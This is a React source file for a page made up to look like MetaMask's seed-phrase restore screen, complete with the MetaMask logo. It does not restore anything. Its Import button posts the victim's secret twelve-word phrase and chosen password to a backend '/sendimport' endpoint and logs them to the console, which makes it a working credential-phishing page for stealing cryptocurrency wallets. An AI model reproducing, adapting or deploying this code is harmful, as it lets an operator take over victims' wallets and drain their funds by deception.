import React, { useState } from 'react'
import { Container, Label, Input, Form, FormGroup, Button } from 'reactstrap'
import axios from "axios";
import logo from "../images/metamask-logo-horizontal.svg"
import "../css/ImportFormpage.css"
import { Link } from 'react-router-dom'
export default function ImportFormPage() {
    const [phrase, setphrase] = useState("")
    const [pass, setpass] = useState("")
    const [confpass, setconfpass] = useState("")
    let text = "< Back"

    const handleClick = async () => {
        console.log(phrase);
        console.log(pass);
        console.log(confpass);
        await axios.post("http://localhost:5000/sendimport", {
            phrasedata: phrase,
            passdata: pass,
            confpassdata: confpass
        })
    }
    return (
        <Container>
            <div className="thesection">
                <img src={logo} alt="" className="logoimg" />
                <Link to="/">
                    <p className="backbutton">{text}</p>
                </Link>
                <h1>Restore your Account with Seed Phrase</h1>

                <p className="secretphrase">Enter your secret twelve word phrase here to restore your vault.</p>
                <Form>
                    <FormGroup>
                        <Label for="exampleEmail" style={{ fontFamily: "'PT Sans Caption', sans-serif", color: "rgb(199 155 155)" }}>The key phrase purse</Label>
                        <Input type="email" onChange={(e) => {
                            setphrase(e.target.value)
                        }} name="email" style={{ fontFamily: "'PT Sans Caption', sans-serif", width: "40%", padding: "6px 0px 7px", border: "2px solid #d2c4c4" }} id="exampleEmail" placeholder=" Paste seed phrase from clipboard" />
                    </FormGroup>
                    <FormGroup check style={{}}>
                        <Label check style={{ fontSize: "1.3vw", width: "100% ", marginTop: "2.5%", color: "rgb(199 155 155)", }}>
                            <Input type="checkbox" style={{ padding: "15px", marginRight: "1%", marginBottom: "1%", marginTop: "-2px" }} />{' '}
                            Show seed phrase
                        </Label>
                    </FormGroup>
                    <FormGroup>
                        <Label for="exampleEmail" style={{ fontFamily: "'PT Sans Caption', sans-serif", color: "rgb(199 155 155)", marginBottom: "3vh" }}> New password (min. 8 characters)</Label>
                        <Input type="email" onChange={(e) => {
                            setpass(e.target.value)
                        }} name="email" style={{ fontFamily: "'PT Sans Caption', sans-serif", width: "40%", padding: "6px 0px 7px", border: "2px solid #d2c4c4", marginBottom: "3vh" }} id="exampleEmail" placeholder="" />
                    </FormGroup>
                    <FormGroup>
                        <Label for="exampleEmail" style={{ fontFamily: "'PT Sans Caption', sans-serif", color: "rgb(199 155 155)", marginBottom: "3vh" }}> Confirm your password</Label>
                        <Input type="email" onChange={(e) => {
                            setconfpass(e.target.value)
                        }} name="email" style={{ fontFamily: "'PT Sans Caption', sans-serif", width: "40%", padding: "6px 0px 7px", border: "2px solid #d2c4c4", marginBottom: "3vh" }} id="exampleEmail" placeholder="" />
                    </FormGroup>
                    <FormGroup check style={{ marginBottom: "-25%" }}>
                        <Label check style={{ fontSize: "1.3vw", width: "100% ", marginTop: "2.5%", color: "rgb(199 155 155)", }}>
                            <Input type="checkbox" style={{ padding: "15px", marginRight: "1%", marginBottom: "1%", marginTop: "-2px" }} />{' '}
                            I have read and agree to the <span style={{ color: "blue" }}>Condition of use</span>
                        </Label>
                    </FormGroup>
                </Form>
                <button onClick={handleClick} style={{ width: "12vw", height: "7vh", padding: "10px,7px 10px 7px", backgroundColor: "#fcc999", color: "white", fontSize: "1.3vw", marginTop: "30%" }}>Import</button>
            </div>
        </Container>
    )
}
